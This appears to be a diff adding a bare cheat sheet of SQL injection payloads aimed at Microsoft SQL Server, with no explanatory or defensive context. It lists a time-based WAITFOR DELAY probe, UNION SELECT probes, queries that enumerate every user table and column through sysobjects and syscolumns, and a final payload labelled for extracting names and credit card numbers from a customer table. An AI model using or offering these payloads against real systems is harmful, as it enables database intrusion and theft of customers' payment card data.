@@ -1,0 +1,14 @@
+Command to run: 
+
+';WAITFOR DELAY '0:0:10'- -
+
+' union select '1', '1','1'—
+
+Get All Table:
+' union select '1', name,'1' from sysobjects where type = 'u'—
+
+Get all columns of all table:
+' union  select sc.name,so.name, '1' from syscolumns sc inner join sysobjects so on sc.id = so.id where so.type = 'u'  order by 2 –
+
+Get Credit card information:
+' union  select name, creditcardnumber, '1' from customer –
